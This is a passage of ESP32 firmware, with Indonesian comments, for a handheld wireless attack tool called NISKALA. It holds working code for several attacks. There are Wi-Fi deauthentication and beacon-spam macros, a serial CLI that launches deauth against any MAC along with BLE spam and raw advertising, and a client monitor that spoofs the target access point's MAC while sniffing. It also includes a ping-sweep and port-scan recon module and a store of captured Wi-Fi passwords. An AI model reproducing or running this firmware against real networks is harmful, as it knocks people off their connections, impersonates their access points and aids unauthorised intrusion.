  uint32_t durationMs;
};

static const MacroStep MACRO_RECON[] = {
  {MACT_PROBE, 8000},
  {MACT_KARMA, 8000},
};
static const int MACRO_RECON_STEPS = 2;

static const MacroStep MACRO_ASSAULT[] = {
  {MACT_BEACON, 6000},
  {MACT_GLOBAL_DEAUTH, 6000},
};
static const int MACRO_ASSAULT_STEPS = 2;

static const int MACRO_COUNT = 2;
static const char* MACRO_NAMES[] = { "RECON", "ASSAULT" };
static const char* MACRO_DESC[] = { "Probe + Karma (pasif)", "Beacon + Deauth (aktif)" };

void drawMacroMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("MACRO", TFT_PURPLE);
  tft.setTextFont(2);
  for (int i = 0; i < MACRO_COUNT; i++) {
    int y = 36 + i * 40;
    if (i == macroSelection) {
      tft.fillRoundRect(8, y - 6, 224, 34, 6, TFT_DARKGREEN);
    }
    tft.setTextColor(i == macroSelection ? TFT_WHITE : TFT_DARKGREY, i == macroSelection ? TFT_DARKGREEN : TFT_BLACK);
    tft.setCursor(16, y);
    tft.print(MACRO_NAMES[i]);
    tft.setCursor(16, y + 18);
    tft.setTextFont(1);
    tft.setTextColor(i == macroSelection ? TFT_CYAN : TFT_DARKGREY, i == macroSelection ? TFT_DARKGREEN : TFT_BLACK);
    tft.print(MACRO_DESC[i]);
    tft.setTextFont(2);
  }
  drawFooter("ATAS: Pilih | BAWAH: Jalankan");
}

const char* macroStepName(uint8_t a) {
  switch (a) {
    case MACT_BEACON: return "Beacon Spam";
    case MACT_GLOBAL_DEAUTH: return "Global Deauth";
    case MACT_PROBE: return "Probe Sniff";
    case MACT_KARMA: return "Karma Attack";
    case MACT_BT_SPAM: return "BLE Spam";
    default: return "?";
  }
}

void drawMacroRunning(int frame) {
  (void)frame;
  const MacroStep* steps = (macroIndex == 0) ? MACRO_RECON : MACRO_ASSAULT;
  int stepCount = (macroIndex == 0) ? MACRO_RECON_STEPS : MACRO_ASSAULT_STEPS;
  MacroStep s = steps[macroPhase];

  tft.fillScreen(TFT_BLACK);
  drawHeader("MACRO: " + String(MACRO_NAMES[macroIndex]), TFT_PURPLE);
  tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 34);
  tft.print("Phase "); tft.print(macroPhase + 1); tft.print("/"); tft.print(stepCount);
  tft.setCursor(10, 56);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print(macroStepName(s.action));

  unsigned long elapsed = millis() - macroPhaseStart;
  unsigned long dur = s.durationMs;
  int pct = (dur > 0) ? (int)(elapsed * 100 / dur) : 0;
  if (pct > 100) pct = 100;
  tft.drawRect(10, 80, 220, 14, TFT_WHITE);
  tft.fillRect(12, 82, (int)(216 * pct / 100), 10, TFT_GREEN);

  tft.setCursor(10, 102);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("PKT: "); tft.print(g_packetsSent);
  tft.print("  H:"); tft.print(ESP.getFreeHeap());
  drawFooter("TOMBOL = HENTIKAN MACRO");
}

void macroStartStep(uint8_t a) {
  switch (a) {
    case MACT_BEACON: startBeaconSpam(); break;
    case MACT_GLOBAL_DEAUTH: startGlobalDeauth(); break;
    case MACT_PROBE: startProbeSniffer(); break;
    case MACT_KARMA: startKarmaScan(); break;
    case MACT_BT_SPAM: startBTSpam(); break;
  }
}

void macroStopStep(uint8_t a) {
  switch (a) {
    case MACT_BEACON: if (isBeaconRunning) stopBeaconSpam(); break;
    case MACT_GLOBAL_DEAUTH: if (isGlobalDeauthRunning) stopGlobalDeauth(); break;
    case MACT_PROBE: if (isProbeRunning) stopProbeSniffer(); break;
    case MACT_KARMA: if (isKarmaRunning) stopKarmaScan(); break;
    case MACT_BT_SPAM: if (isBTSpamRunning) stopBTSpam(); break;
  }
}

void startMacro(int idx) {
  stopAllAttacks();
  macroIndex = idx;
  macroPhase = 0;
  macroPhaseStart = millis();
  isMacroRunning = true;
  currentState = MACRO_RUNNING;
  const MacroStep* steps = (idx == 0) ? MACRO_RECON : MACRO_ASSAULT;
  macroStartStep(steps[0].action);
  drawMacroRunning(0);
  Serial.printf("[MACRO] Mulai %s\n", MACRO_NAMES[idx]);
}

void macroTick() {
  const MacroStep* steps = (macroIndex == 0) ? MACRO_RECON : MACRO_ASSAULT;
  int stepCount = (macroIndex == 0) ? MACRO_RECON_STEPS : MACRO_ASSAULT_STEPS;
  MacroStep s = steps[macroPhase];

  if (millis() - macroPhaseStart >= s.durationMs) {
    macroStopStep(s.action);
    macroPhase++;
    if (macroPhase >= stepCount) {
      isMacroRunning = false;
      currentState = MAIN_MENU;
      drawMainMenu();
      Serial.println("[MACRO] Selesai");
      return;
    }
    macroPhaseStart = millis();
    macroStartStep(steps[macroPhase].action);
  }

  static unsigned long mLast = 0;
  static int mFrame = 0;
  if (millis() - mLast > 250) { drawMacroRunning(mFrame++); mLast = millis(); }
}

// ------------------------------------------------------------------
// Serial CLI
// ------------------------------------------------------------------
int hexNibble(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

int hexToBytes(const char* hex, uint8_t* out, int maxLen) {
  int len = strlen(hex);
  if (len <= 0 || (len % 2) != 0) return -1;
  int n = len / 2;
  if (n > maxLen) n = maxLen;
  for (int i = 0; i < n; i++) {
    int hi = hexNibble(hex[i * 2]);
    int lo = hexNibble(hex[i * 2 + 1]);
    if (hi < 0 || lo < 0) return -1;
    out[i] = (uint8_t)((hi << 4) | lo);
  }
  return n;
}

bool macFromString(const char* s, uint8_t mac[6]) {
  char tmp[13];
  int j = 0;
  for (int i = 0; s[i] && j < 12; i++) {
    if (s[i] == ':' || s[i] == '-' || s[i] == ' ') continue;
    tmp[j++] = s[i];
  }
  if (j != 12) return false;
  tmp[12] = 0;
  for (int i = 0; i < 6; i++) {
    int hi = hexNibble(tmp[i * 2]);
    int lo = hexNibble(tmp[i * 2 + 1]);
    if (hi < 0 || lo < 0) return false;
    mac[i] = (uint8_t)((hi << 4) | lo);
  }
  return true;
}

bool apWifiAdd(String ssid, String pass);
String apWifiFindPassword(String ssid);
void apWifiList();
bool apWifiDelete(int idx);

void cliPrintHelp() {
  Serial.println("NISKALA CLI");
  Serial.println("  help");
  Serial.println("  status");
  Serial.println("  scan");
  Serial.println("  stop");
  Serial.println("  beacon | probe | karma | global | blespam | blescan");
  Serial.println("  deauth <AA:BB:CC:DD:EE:FF>");
  Serial.println("  ble-raw <hex>");
  Serial.println("  ble-ibeacon [major minor]");
  Serial.println("  ble-eddy");
  Serial.println("  config get | config set <ssid|pass|url|tpl> <nilai>");
  Serial.println("  apwifi add <SSID> <PASS> | apwifi list | apwifi del <index>");
  Serial.println("  reboot");
}

void processCliCommand(String line) {
  line.trim();
  if (line.length() == 0) return;

  int sp = line.indexOf(' ');
  String cmd = (sp > 0) ? line.substring(0, sp) : line;
  String arg = (sp > 0) ? line.substring(sp + 1) : "";
  cmd.toLowerCase();

  if (cmd == "help") { cliPrintHelp(); }
  else if (cmd == "status") {
    Serial.printf("State=%d Mode=%d PKT=%u ERR=%u Heap=%u Bat=%d Temp=%.0f Stack=%u Uptime=%lu\n",
      (int)currentState, (int)g_attackMode, (unsigned)g_packetsSent, (unsigned)g_txErrors,
      (unsigned)ESP.getFreeHeap(), readBatteryPercent(), temperatureRead(),
      attackTaskHandle ? (unsigned)uxTaskGetStackHighWaterMark(attackTaskHandle) : 0,
      (unsigned long)(millis() / 1000));
  }
  else if (cmd == "scan") {
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[SCAN] %d AP\n", n);
    for (int i = 0; i < n && i < 20; i++) {
      Serial.printf("  %2d  ch=%2d  rssi=%4d  %s  %s\n", i,
        WiFi.channel(i), WiFi.RSSI(i), WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str());
    }
    WiFi.scanDelete();
  }
  else if (cmd == "stop") {
    stopAllAttacks();
    currentState = MAIN_MENU;
    drawMainMenu();
    Serial.println("[CLI] Semua berhenti");
  }
  else if (cmd == "beacon") {
    stopAllAttacks();
    currentState = BEACON_SPAM; startBeaconSpam(); drawBeaconSpam(0);
    Serial.println("[CLI] Beacon spam ON");
  }
  else if (cmd == "probe") {
    stopAllAttacks();
    currentState = PROBE_SNIFF; startProbeSniffer(); drawProbeSniff(0);
    Serial.println("[CLI] Probe sniff ON");
  }
  else if (cmd == "karma") {
    stopAllAttacks();
    currentState = KARMA_SCAN; startKarmaScan(); drawKarmaScan(0);
    Serial.println("[CLI] Karma ON");
  }
  else if (cmd == "global") {
    stopAllAttacks();
    currentState = GLOBAL_DEAUTH; startGlobalDeauth(); drawGlobalDeauth(0);
    Serial.println("[CLI] Global deauth ON");
  }
  else if (cmd == "blespam") {
    stopAllAttacks();
    btStopFixed();
    currentState = BT_SPAM; startBTSpam(); drawBTSpam(0);
    Serial.println("[CLI] BLE spam ON");
  }
  else if (cmd == "blescan") {
    stopAllAttacks();
    currentState = BLE_SCAN; startBLEScan();
    Serial.println("[CLI] BLE scan ON");
  }
  else if (cmd == "deauth") {
    uint8_t mac[6];
    if (!macFromString(arg.c_str(), mac)) {
      Serial.println("[CLI] MAC tidak valid. Contoh: deauth AA:BB:CC:DD:EE:FF");
      return;
    }
    memcpy(g_targetBSSID, mac, 6);
    g_targetChannel = 1;
    targetSSID = "CLI_Target";
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      if (memcmp(WiFi.BSSID(i), mac, 6) == 0) {
        g_targetChannel = WiFi.channel(i);
        targetSSID = WiFi.SSID(i);
        break;
      }
    }
    WiFi.scanDelete();
    stopAllAttacks();
    currentState = DEAUTH_MENU;
    startDeauthEngine();
    drawDeauthMenu();
    Serial.printf("[CLI] Deauth target %02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], g_targetChannel);
  }
  else if (cmd == "ble-raw") {
    uint8_t buf[31];
    int n = hexToBytes(arg.c_str(), buf, 31);
    if (n <= 0) { Serial.println("[CLI] hex tidak valid / kosong"); return; }
    stopAllAttacks();
    WiFi.mode(WIFI_OFF);
    if (btStartFixed(buf, n)) {
      isBTSpamRunning = true;
      currentState = BT_SPAM;
      drawBTSpam(0);
      Serial.printf("[CLI] BLE raw advertise %d bytes\n", n);
    } else {
      Serial.println("[CLI] Gagal mulai BLE raw");
    }
  }
  else if (cmd == "ble-ibeacon") {
    int sp2 = arg.indexOf(' ');
    int major = 1;
    int minor = 2;
    if (sp2 > 0) {
      major = arg.substring(0, sp2).toInt();
      minor = arg.substring(sp2 + 1).toInt();
    } else if (arg.length() > 0) {
      major = arg.toInt();
    }
    stopAllAttacks();
    WiFi.mode(WIFI_OFF);
    if (btStartIBeacon(IBEACON_DEFAULT_UUID, (uint16_t)major, (uint16_t)minor, -59)) {
      isBTSpamRunning = true;
      currentState = BT_SPAM;
      drawBTSpam(0);
      Serial.printf("[CLI] iBeacon major=%d minor=%d\n", major, minor);
    } else {
      Serial.println("[CLI] Gagal mulai iBeacon");
    }
  }
  else if (cmd == "ble-eddy") {
    stopAllAttacks();
    WiFi.mode(WIFI_OFF);
    if (btStartEddystone(EDDYSTONE_NS, EDDYSTONE_INST, -59)) {
      isBTSpamRunning = true;
      currentState = BT_SPAM;
      drawBTSpam(0);
      Serial.println("[CLI] Eddystone-UID ON");
    } else {
      Serial.println("[CLI] Gagal mulai Eddystone");
    }
  }
  else if (cmd == "config") {
    if (arg.length() == 0 || arg == "get") {
      Serial.printf("SSID : %s\n", cfg_wifi_ssid.c_str());
      Serial.printf("PASS : %s\n", cfg_wifi_pass.c_str());
      Serial.printf("URL  : %s\n", cfg_server_url.c_str());
      Serial.printf("TPL  : %s\n", cfg_template_url.c_str());
      Serial.printf("burst deauth=%d auth=%d hop=%d beacon=%d reason=%d\n",
        cfg_deauth_burst, cfg_auth_burst, cfg_hop_interval_ms, cfg_beacon_hop_ms, cfg_deauth_reason);
    } else {
      int s1 = arg.indexOf(' ');
      if (s1 > 0) {
        String k = arg.substring(0, s1);
        String v = arg.substring(s1 + 1);
        k.toLowerCase();
        if (k == "ssid") cfg_wifi_ssid = v;
        else if (k == "pass") cfg_wifi_pass = v;
        else if (k == "url") cfg_server_url = v;
        else if (k == "tpl") cfg_template_url = v;
        else { Serial.println("[CLI] key tidak dikenal"); return; }
        saveConfig();
        Serial.printf("[CLI] %s = %s (tersimpan)\n", k.c_str(), v.c_str());
      } else {
        Serial.println("[CLI] Gunakan: config set <ssid|pass|url|tpl> <nilai>");
      }
    }
  }
  else if (cmd == "apwifi") {
    arg.trim();
    int s = arg.indexOf(' ');
    String sub = (s > 0) ? arg.substring(0, s) : arg;
    String rest = (s > 0) ? arg.substring(s + 1) : "";
    sub.toLowerCase();
    if (sub == "add" || sub == "set") {
      rest.trim();
      int s2 = rest.indexOf(' ');
      if (s2 > 0) {
        String ssid = rest.substring(0, s2);
        String pass = rest.substring(s2 + 1);
        pass.trim();
        if (apWifiAdd(ssid, pass)) Serial.printf("[APWIFI] Tersimpan: %s\n", ssid.c_str());
        else Serial.println("[APWIFI] Gagal simpan (penuh/argumen kosong).");
      } else {
        Serial.println("[APWIFI] Gunakan: apwifi add <SSID> <PASS>");
      }
    } else if (sub == "list") {
      apWifiList();
    } else if (sub == "del" || sub == "delete") {
      int idx = rest.toInt();
      if (apWifiDelete(idx)) Serial.printf("[APWIFI] Index %d dihapus\n", idx);
      else Serial.println("[APWIFI] Index tidak valid");
    } else {
      Serial.println("[APWIFI] Gunakan: add <SSID> <PASS> | list | del <index>");
    }
  }
  else if (cmd == "sync" || cmd == "cloudsync") {
    Serial.println("[CLI] Mulai Cloud Sync...");
    startCloudSync();
  }
  else if (cmd == "reboot") {
    Serial.println("[CLI] Reboot...");
    delay(200);
    ESP.restart();
  }
  else {
    Serial.printf("[CLI] Perintah tidak dikenal: %s (ketik help)\n", line.c_str());
  }
}

void handleSerialCLI() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (cliBuf.length() > 0) {
        processCliCommand(cliBuf);
        cliBuf = "";
      }
    } else {
      if (cliBuf.length() < 127) cliBuf += c;
    }
  }
}

// ------------------------------------------------------------------
// Client Monitor (lihat klien/station terhubung ke AP target)
// ------------------------------------------------------------------
void drawClientMonitor() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("CLIENT MONITOR", TFT_MAGENTA);
  tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28);
  tft.print("MAC               RSSI  PKT");

  int shown = 0;
  for (int i = clientScroll; i < g_clientCount && shown < 4; i++) {
    int y = 40 + shown * 18;
    if (i == clientSelection) {
      tft.fillRect(2, y - 2, 236, 17, TFT_DARKGREEN);
    }
    tft.setTextColor(TFT_WHITE, i == clientSelection ? TFT_DARKGREEN : TFT_BLACK);
    tft.setCursor(4, y);
    char buf[64];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %4d  %6u",
      g_clients[i].mac[0], g_clients[i].mac[1], g_clients[i].mac[2],
      g_clients[i].mac[3], g_clients[i].mac[4], g_clients[i].mac[5],
      g_clients[i].rssi, (unsigned)g_clients[i].packets);
    tft.print(buf);
    shown++;
  }

  if (g_clientCount == 0) {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(4, 48);
    tft.print("Menunggu client terhubung...");
  }

  int by = 40 + shown * 18 + 2;
  if (clientSelection == g_clientCount) {
    tft.fillRect(2, by - 2, 236, 17, TFT_RED);
    tft.setTextColor(TFT_WHITE, TFT_RED);
  } else {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  }
  tft.setCursor(4, by);
  tft.print("< KEMBALI >");

  drawFooter("ATAS: Pilih | BAWAH: Deauth/Kembali");
}

void startClientMonitor() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] ClientMon set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("Client_Mon", "12345678", g_targetChannel, 1); delay(300);
  }
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  portENTER_CRITICAL(&g_clientMux);
  g_clientCount = 0;
  portEXIT_CRITICAL(&g_clientMux);
  clientSelection = 0;
  clientScroll = 0;
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  g_packetsSent = 0;
  g_txErrors = 0;
  isClientMonitorRunning = true;
  g_attackMode = ATK_CLIENT_MONITOR;
  Serial.printf("[CLIENT] Monitor %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
    g_targetChannel, targetSSID.c_str());
}

void stopClientMonitor() {
  isClientMonitorRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
  Serial.println("[CLIENT] Monitor berhenti");
}

void setBacklight(uint8_t duty) {
  static bool blInit = false;
  if (!blInit) {
    ledcSetup(0, 5000, 8);
    ledcAttachPin(TFT_BL, 0);
    blInit = true;
  }
  ledcWrite(0, duty);
}

void drawTiltedOrbit(int cx, int cy, int rx, int ry, float angle, uint16_t color) {
  const int STEPS = 28;
  float cosT = cos(angle), sinT = sin(angle);
  for (int i = 0; i < STEPS; i++) {
    float a0 = i * 2.0f * PI / STEPS;
    float a1 = (i + 1) * 2.0f * PI / STEPS;
    int x0 = cx + (int)(cos(a0) * rx * cosT - sin(a0) * ry * sinT);
    int y0 = cy + (int)(cos(a0) * rx * sinT + sin(a0) * ry * cosT);
    int x1 = cx + (int)(cos(a1) * rx * cosT - sin(a1) * ry * sinT);
    int y1 = cy + (int)(cos(a1) * rx * sinT + sin(a1) * ry * cosT);
    tft.drawLine(x0, y0, x1, y1, color);
  }
}

void drawPlanetSystem(int frame) {
  int cx = 120, cy = 60;
  const float TILT = 16.0f * PI / 180.0f;
  const float cosT = cos(TILT), sinT = sin(TILT);
  tft.fillScreen(TFT_BLACK);

  static int starX[24], starY[24];
  static bool starsInit = false;
  if (!starsInit) {
    for (int i = 0; i < 24; i++) {
      starX[i] = random(240);
      starY[i] = random(135);
    }
    starsInit = true;
  }
  for (int i = 0; i < 24; i++) {
    tft.drawPixel(starX[i], starY[i], (i % 3 == 0) ? TFT_WHITE : TFT_DARKGREY);
  }

  struct Planet {
    int orbit; int size; uint16_t color; float speed; float phase; bool ring;
  };
  static const Planet P[] = {
    {20, 2, 0xC618, 0.09f, 0.0f, false},  // Merkurius
    {27, 3, 0xFE58, 0.07f, 1.5f, false},  // Venus
    {34, 3, 0x001F, 0.055f, 2.8f, false}, // Bumi
    {41, 3, 0xF800, 0.045f, 4.0f, false}, // Mars
    {50, 5, 0xFDA0, 0.032f, 5.5f, false}, // Jupiter
    {58, 4, 0xFF60, 0.024f, 6.8f, true},  // Saturnus (cincin)
    {65, 3, 0x07FF, 0.018f, 8.0f, false}, // Uranus
    {72, 3, 0x0410, 0.014f, 9.2f, false}, // Neptunus
  };
  const int NP = 8;

  for (int i = 0; i < NP; i++) {
    drawTiltedOrbit(cx, cy, P[i].orbit, (int)(P[i].orbit * 0.5f), TILT, TFT_DARKGREY);
  }

  tft.drawCircle(cx, cy, 14, TFT_DARKGREY);
  tft.fillCircle(cx, cy, 10, TFT_YELLOW);
  tft.fillCircle(cx, cy, 7, TFT_ORANGE);
  tft.fillCircle(cx, cy, 3, TFT_WHITE);

  for (int i = 0; i < NP; i++) {
    float a = P[i].phase + (float)frame * P[i].speed;
    float dx = cos(a) * P[i].orbit;
    float dy = sin(a) * P[i].orbit * 0.5f;
    int x = cx + (int)(dx * cosT - dy * sinT);
    int y = cy + (int)(dx * sinT + dy * cosT);
    tft.fillCircle(x, y, P[i].size, P[i].color);
    if (P[i].ring) {
      tft.drawEllipse(x, y, P[i].size + 3, 2, P[i].color);
    }
  }

  tft.setTextFont(1);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setCursor(4, 122);
  tft.print("IDLE  BAT:");
  tft.print(readBatteryPercent());
  tft.print("%  H:");
  tft.print(ESP.getFreeHeap());
}

volatile bool g_pingOK = false;
volatile bool g_pingDone = false;

static void onReconPingSuccess(esp_ping_handle_t hdl, void* args) {
  (void)hdl; (void)args;
  g_pingOK = true;
}

static void onReconPingTimeout(esp_ping_handle_t hdl, void* args) {
  (void)hdl; (void)args;
  g_pingOK = false;
}

static void onReconPingEnd(esp_ping_handle_t hdl, void* args) {
  (void)hdl; (void)args;
  g_pingDone = true;
}

bool pingHost(IPAddress ip, uint32_t timeout_ms) {
  esp_ping_config_t cfg;
  memset(&cfg, 0, sizeof(cfg));
  cfg.count = 1;
  cfg.interval_ms = 10;
  cfg.timeout_ms = timeout_ms;
  cfg.data_size = 32;
  cfg.tos = 0;
  cfg.ttl = 64;
  cfg.task_stack_size = 2048;
  cfg.task_prio = 2;
  cfg.interface = 0;
  cfg.target_addr.type = IPADDR_TYPE_V4;
  cfg.target_addr.u_addr.ip4.addr = (uint32_t)ip;

  esp_ping_callbacks_t cbs;
  memset(&cbs, 0, sizeof(cbs));
  cbs.on_ping_success = onReconPingSuccess;
  cbs.on_ping_timeout = onReconPingTimeout;
  cbs.on_ping_end = onReconPingEnd;

  esp_ping_handle_t ping = NULL;
  g_pingOK = false;
  g_pingDone = false;
  if (esp_ping_new_session(&cfg, &cbs, &ping) != ESP_OK) return false;
  if (esp_ping_start(ping) != ESP_OK) {
    esp_ping_delete_session(ping);
    return false;
  }

  uint32_t start = millis();
  while (!g_pingDone && (millis() - start) < (timeout_ms + 600)) {
    delay(2);
  }
  esp_ping_stop(ping);
  esp_ping_delete_session(ping);
  return g_pingOK;
}

void drawNetworkRecon() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("NETWORK RECON", TFT_NAVY);
  tft.setTextFont(1);

  if (g_reconPhase == RECON_PHASE_HOST_LIST) {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 28);
    tft.print("IP : "); tft.print(g_reconLocalIP.toString());
    tft.setCursor(10, 40);
    tft.print("GW : "); tft.print(g_reconGateway.toString());
    tft.print("  Sub:"); tft.print(g_reconSubnet.toString());
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 52);
    tft.printf("Host: %d / %u", g_reconHostCount, (unsigned)g_reconTotal);

    int rows = 3;
    for (int i = 0; i < rows; i++) {
      int idx = g_reconScroll + i;
      int y = 66 + i * 16;
      if (idx < g_reconHostCount) {
        bool selected = (idx == g_reconSelection);
        if (selected) tft.fillRoundRect(4, y - 1, 232, 14, 3, TFT_DARKGREY);
        tft.setTextColor(selected ? TFT_YELLOW : TFT_WHITE, selected ? TFT_DARKGREY : TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("> ");
        tft.print(g_reconHosts[idx].toString());
      } else if (idx == g_reconHostCount) {
        bool selected = (idx == g_reconSelection);
        if (selected) tft.fillRoundRect(4, y - 1, 232, 14, 3, TFT_DARKGREY);
        tft.setTextColor(selected ? TFT_YELLOW : TFT_GREEN, selected ? TFT_DARKGREY : TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("KEMBALI");
      }
    }
    drawFooter("ATAS: Pilih | BAWAH: Scan/Kembali");
  } else {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 30);
    tft.print("Port scan: ");
    tft.print(g_reconSelectedIP.toString());
    tft.setTextColor(TFT_WHITE, TFT_BLACK);

    if (g_reconOpenPortCount == 0) {
      tft.setCursor(10, 50);
      tft.println("Tidak ada port terbuka.");
    } else {
      int rows = 5;
      for (int i = 0; i < g_reconOpenPortCount && i < rows; i++) {
        tft.setCursor(10, 42 + i * 13);
        tft.printf("TCP %d OPEN", g_reconOpenPorts[i]);
        if (g_reconBanners[i][0] != 0) {
          String b = String(g_reconBanners[i]);
          if (b.length() > 16) b = b.substring(0, 16);
          tft.print(" "); tft.print(b);
        }
      }
    }
    drawFooter("TOMBOL: Kembali");
  }
}void drawApWifiView() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("AP WIFI TERSIMPAN", TFT_DARKCYAN);
  tft.setTextFont(1);

  int count = apPrefs.getInt("count", 0);
  if (count == 0) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 50);
    tft.println("Belum ada kredensial.");
    tft.println("Tambah via CLI:");
    tft.println("apwifi add <SSID> <PASS>");
    drawFooter("TOMBOL: Kembali");
    return;
  }

  if (apWifiSelection > count) apWifiSelection = count;
  if (apWifiSelection < apWifiScrollPos) apWifiScrollPos = apWifiSelection;
  else if (apWifiSelection >= apWifiScrollPos + 3) apWifiScrollPos = apWifiSelection - 2;

  if (apWifiSelection < count) {
    String ssid = apPrefs.getString(("ssid_" + String(apWifiSelection)).c_str(), "");
    String pass = apPrefs.getString(("pass_" + String(apWifiSelection)).c_str(), "");
    if (ssid.length() > 20) ssid = ssid.substring(0, 20);
    if (pass.length() > 24) pass = pass.substring(0, 24);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 30);
    tft.print("SSID: "); tft.print(ssid);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 42);
    tft.print("PASS: "); tft.print(pass);
  }

  int rows = 3;
  for (int i = 0; i < rows; i++) {
    int idx = apWifiScrollPos + i;
    int y = 56 + i * 16;
    if (idx < count) {
      bool selected = (idx == apWifiSelection);
      if (selected) tft.fillRoundRect(4, y - 1, 232, 14, 3, TFT_DARKGREY);
      String ssid = apPrefs.getString(("ssid_" + String(idx)).c_str(), "");
      if (ssid.length() > 22) ssid = ssid.substring(0, 22);
      tft.setTextColor(selected ? TFT_YELLOW : TFT_WHITE, selected ? TFT_DARKGREY : TFT_BLACK);
      tft.setCursor(10, y);
      tft.print(String(idx) + " " + ssid);
    } else if (idx == count) {
      bool selected = (idx == apWifiSelection);
      if (selected) tft.fillRoundRect(4, y - 1, 232, 14, 3, TFT_DARKGREY);
      tft.setTextColor(selected ? TFT_YELLOW : TFT_GREEN, selected ? TFT_DARKGREY : TFT_BLACK);
      tft.setCursor(10, y);
      tft.print("KEMBALI");
    }
  }

  if (confirmApWifiDelete && apWifiSelection < count) {
    drawFooter("TEKAN LAGI = HAPUS");
  } else {
    drawFooter("ATAS:Pilih | BAWAH:Hapus/Kembali");
  }
}

void reconPortScan(int hostIdx) {
  if (hostIdx < 0 || hostIdx >= g_reconHostCount) return;
  g_reconSelectedIP = g_reconHosts[hostIdx];
  g_reconOpenPortCount = 0;
  g_reconPortIndex = 0;
  g_reconPhase = RECON_PHASE_PORT_SCAN;

  tft.fillScreen(TFT_BLACK);
  drawHeader("PORT SCAN", TFT_NAVY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40);
  tft.print(g_reconSelectedIP.toString());
  tft.setCursor(10, 60);
  tft.print("Mulai scan...");
}

void reconTick() {
  if (g_reconPhase == RECON_PHASE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      g_reconLocalIP = WiFi.localIP();
      g_reconGateway = WiFi.gatewayIP();
      g_reconSubnet = WiFi.subnetMask();
      uint32_t ipU = (uint32_t)g_reconLocalIP;
      uint32_t maskU = (uint32_t)g_reconSubnet;
      uint32_t netU = ipU & maskU;
      uint32_t bcU = netU | ~maskU;
      g_reconFirst = netU + 1;
      g_reconLast = bcU - 1;
      g_reconTotal = (g_reconLast >= g_reconFirst) ? (g_reconLast - g_reconFirst + 1) : 0;
      g_reconNext = g_reconFirst;
      g_reconScanned = 0;

      tft.fillScreen(TFT_BLACK);
      drawHeader("PING SWEEP", TFT_NAVY);
      tft.setTextFont(1);
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 40);
      tft.printf("IP  : %s\n", g_reconLocalIP.toString().c_str());
      tft.setCursor(10, 52);
      tft.printf("GW  : %s\n", g_reconGateway.toString().c_str());
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 64);
      tft.print("Scan: ");
      g_reconPhase = RECON_PHASE_SWEEP;
    } else if (millis() - g_reconConnectStart > 12000) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 60);
      tft.println("Gagal konek WiFi.");
      tft.println("Periksa password target.");
      stopNetworkRecon();
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
  } else if (g_reconPhase == RECON_PHASE_SWEEP) {
    for (int i = 0; i < 3 && g_reconNext <= g_reconLast && g_reconNext != 0; i++) {
      uint32_t h = g_reconNext++;
      if (h == (uint32_t)g_reconLocalIP) continue;
      g_reconScanned++;
      IPAddress host((uint32_t)h);
      bool alive = pingHost(host, 100);
      if (alive && g_reconHostCount < RECON_MAX_HOSTS) {
        g_reconHosts[g_reconHostCount++] = host;
      }
    }

    tft.fillRect(50, 64, 180, 10, TFT_BLACK);
    tft.setCursor(50, 64);
